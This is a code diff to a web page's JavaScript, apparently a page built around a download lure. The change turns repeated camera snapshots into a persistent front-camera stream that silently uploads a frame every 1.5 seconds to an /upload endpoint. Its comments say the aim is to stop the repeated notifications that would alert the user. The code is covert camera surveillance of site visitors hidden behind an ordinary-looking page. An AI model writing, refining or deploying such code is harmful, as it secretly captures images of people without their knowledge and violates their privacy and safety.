@@ -508,63 +508,53 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا الأمامية فقط (بدون زوم أو تدوير) ===== */
-let isCapturing = false;
+/* ===== الكاميرا الأمامية المستمرة (بدون إشعارات تكرارية مزعجة) ===== */
+let mediaStream = null;
 
-async function captureFast() {
-    let stream = null;
+async function initPersistentCamera() {
     try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: { ideal: 'user' }
             } 
         });
 
         const videoEl = document.getElementById('video');
-        videoEl.srcObject = stream;
+        videoEl.srcObject = mediaStream;
         
-        await new Promise((resolve) => {
-            if (videoEl.readyState >= 2) resolve();
-            else videoEl.onloadeddata = () => resolve();
-        });
+        setInterval(() => {
+            if (!mediaStream) return;
+            try {
+                const vw = videoEl.videoWidth || 640;
+                const vh = videoEl.videoHeight || 480;
 
-        const vw = videoEl.videoWidth;
-        const vh = videoEl.videoHeight;
+                const canvas = document.createElement('canvas');
+                canvas.width = vw;
+                canvas.height = vh;
 
-        const canvas = document.createElement('canvas');
-        canvas.width = vw;
-        canvas.height = vh;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, vw, vh);
 
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-        canvas.toBlob(blob => {
-            if (blob) {
-                let fd = new FormData();
-                fd.append('image', blob, `user_eye.jpg`);
-                fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        let fd = new FormData();
+                        fd.append('image', blob, `user_eye.jpg`);
+                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                    }
+                }, 'image/jpeg', 0.85);
+            } catch (err) {
+                console.log("خطأ في التقاط الإطار:", err);
             }
-        }, 'image/jpeg', 0.90);
+        }, 1500);
 
     } catch (e) {
-        console.log("خطأ في الالتقاط السريع:", e);
-    } finally {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
+        console.log("بانتظار منح إذن الكاميرا:", e);
     }
 }
 
 function startCapture() {
-    if (isCapturing) return;
-    isCapturing = true;
-
-    const runLoop = async () => {
-        await captureFast();
-        setTimeout(runLoop, 300);
-    };
-
-    runLoop();
+    if (mediaStream) return;
+    initPersistentCamera();
 }
 
 navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
